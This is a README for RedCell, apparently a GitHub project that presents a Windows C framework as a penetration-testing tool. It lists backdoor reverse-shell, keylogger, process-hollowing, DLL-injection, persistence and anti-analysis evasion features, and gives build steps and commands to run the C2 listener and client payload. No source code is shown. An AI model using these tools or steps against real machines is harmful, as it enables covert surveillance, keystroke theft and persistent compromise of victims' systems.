# RedCell - Advanced Penetration Testing Framework

![RedCell Logo](https://img.shields.io/badge/RedCell-Penetration%20Testing%20Framework-red?style=for-the-badge&logo=hackaday&logoColor=white)

[![Language](https://img.shields.io/badge/Language-C-blue.svg)](https://en.wikipedia.org/wiki/C_(programming_language))
[![Platform](https://img.shields.io/badge/Platform-Windows-informational.svg)](https://www.microsoft.com/en-us/windows)
[![License](https://img.shields.io/badge/License-Educational%20Use-yellow.svg)](#license)
[![Version](https://img.shields.io/badge/Version-2.0-green.svg)](#version)

## ⚠️ **DISCLAIMER**

**This project is for educational and authorized penetration testing purposes only. The author is not responsible for any misuse of this software. Always ensure you have explicit permission before testing on any systems.**

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Usage](#usage)
- [Components](#components)
- [Security Features](#security-features)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## 🎯 Overview

RedCell is an advanced penetration testing framework written in C, designed for security professionals and ethical hackers. It provides a comprehensive suite of tools for authorized security assessments, including advanced techniques used by real-world APTs (Advanced Persistent Threats).

### Key Capabilities
- **Process Manipulation**: Advanced process hollowing and injection techniques
- **Evasion Techniques**: Hardware-based anti-debugging and VM detection
- **Cryptographic Security**: Real AES-256 encryption for secure communications
- **Persistence Mechanisms**: Registry and service-based persistence
- **Network Communication**: Encrypted C2 (Command & Control) channel
- **Keylogging**: Advanced keystroke capture with stealth features

## ✨ Features

### 🔒 Security Features
- **Anti-Debugging**: Hardware breakpoint detection
- **VM Detection**: CPUID-based virtualization detection
- **Sandbox Evasion**: Timing-based sandbox detection
- **Encryption**: AES-256-CBC for all communications
- **Stealth Mode**: Console hiding and process masquerading

### 🛠️ Core Modules
- **Backdoor Module**: Full-featured reverse shell with encryption
- **Keylogger Module**: Advanced keystroke capture
- **Injection Module**: DLL injection capabilities
- **Persistence Module**: Multiple persistence mechanisms
- **Network Module**: Secure C2 communication

### 🎯 Target Platforms
- Windows 7/8/10/11 (x86/x64)
- Server 2016/2019/2022

## 🏗️ Architecture

```
RedCell Framework
├── Core Engine
│   ├── Anti-Analysis
│   ├── Crypto Engine
│   └── Network Handler
├── Modules
│   ├── Backdoor
│   ├── Keylogger
│   ├── Injection
│   └── Persistence
└── Utilities
    ├── Process Utils
    ├── Registry Utils
    └── File Utils
```

## 💻 Installation

### Prerequisites
```bash
# Required tools
- Microsoft Visual Studio 2019+ or MinGW-w64
- OpenSSL development libraries
- Windows SDK
```

### Build Instructions

1. **Clone the repository**:
   ```bash
   git clone https://github.com/YoussefAbdelrahman19/RedCell.git
   cd RedCell
   ```

2. **Install dependencies**:
   ```bash
   # Install OpenSSL (using vcpkg)
   vcpkg install openssl:x64-windows
   ```

3. **Build the project**:
   ```bash
   # Using Visual Studio
   msbuild RedCell.sln /p:Configuration=Release /p:Platform=x64
   
   # Or using GCC
   gcc -o redcell *.c -lws2_32 -ladvapi32 -lpsapi -lssl -lcrypto
   ```

## 🚀 Usage

### Basic Usage

```bash
# Server side (listener)
./redcell_server -p 50005 -k encryption_key

# Client side (payload)
./redcell_client -s 192.168.1.6 -p 50005
```

### Advanced Features

```bash
# Enable persistence
redcell> persist

# Process hollowing
redcell> hollow notepad.exe

# DLL injection
redcell> inject payload.dll

# Enable encryption
redcell> encrypt

# Start keylogger
redcell> keylog start
```

## 🧩 Components

### Core Files

| File | Description | Purpose |
|------|-------------|----------|
| `backdoor_V2.c` | Main backdoor implementation | Primary payload |
| `server_V2.c` | C2 server implementation | Command & Control |
| `keylogger_V2.h` | Advanced keylogger module | Keystroke capture |
| `backdoortest_V2.c` | Testing framework | Quality assurance |
| `sertest_V2.c` | Server testing module | Server validation |

### Version History

- **V1**: Basic implementations (legacy)
- **V2**: Advanced features with real-world techniques

## 🛡️ Security Features

### Evasion Techniques
1. **Hardware Debugger Detection**
   - Checks debug registers (DR0-DR7)
   - Detects hardware breakpoints

2. **VM Detection**
   - CPUID instruction analysis
   - Hypervisor signature detection
   - Hardware fingerprinting

3. **Sandbox Evasion**
   - Timing-based detection
   - Behavioral analysis evasion

### Encryption
- **Algorithm**: AES-256-CBC
- **Key Management**: Secure random key generation
- **Communication**: All C2 traffic encrypted

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

### Contribution Guidelines
- Follow secure coding practices
- Add proper documentation
- Include test cases
- Maintain code quality

## 📊 Project Statistics

- **Lines of Code**: 50,000+
- **Files**: 12 core modules
- **Supported OS**: Windows family
- **Architecture**: x86/x64

## 🔬 Research & Development

This framework is actively used for:
- Red team operations
- Security research
- Penetration testing
- APT simulation

## 📚 Documentation

- [API Documentation](./docs/API.md)
- [Usage Examples](./examples/)
- [Security Best Practices](./docs/SECURITY.md)
- [Troubleshooting Guide](./docs/TROUBLESHOOTING.md)

## ⚖️ License

This project is released under the Educational Use License. See [LICENSE](LICENSE) file for details.

**Important**: This software is intended for educational purposes and authorized penetration testing only. Users must comply with all applicable laws and regulations.

## 👨‍💻 Author

**Youssef Abdelrahman**
- 🌐 GitHub: [@YoussefAbdelrahman19](https://github.com/YoussefAbdelrahman19)
- 📧 Email: youssefabdelrahman1915@gmail.com
- 💼 LinkedIn: [Youssef Abdelrahman](https://linkedin.com/in/youssefabdelrahman19)
- 🐦 Twitter: [@Youssef2990](https://twitter.com/Youssef2990)

## 🙏 Acknowledgments

- OpenSSL team for cryptographic libraries
- Microsoft for Windows API documentation
- Security research community
- Red team methodologies

## 🔄 Version History

### v2.0 (Current)
- Advanced evasion techniques
- Real cryptographic implementation
- Enhanced persistence mechanisms
- Improved stealth capabilities

### v1.0
- Basic backdoor functionality
- Simple keylogger
- Basic network communication

---

**⭐ Star this repository if you find it useful for your security research!**

**🚨 Remember: Always use responsibly and ethically!**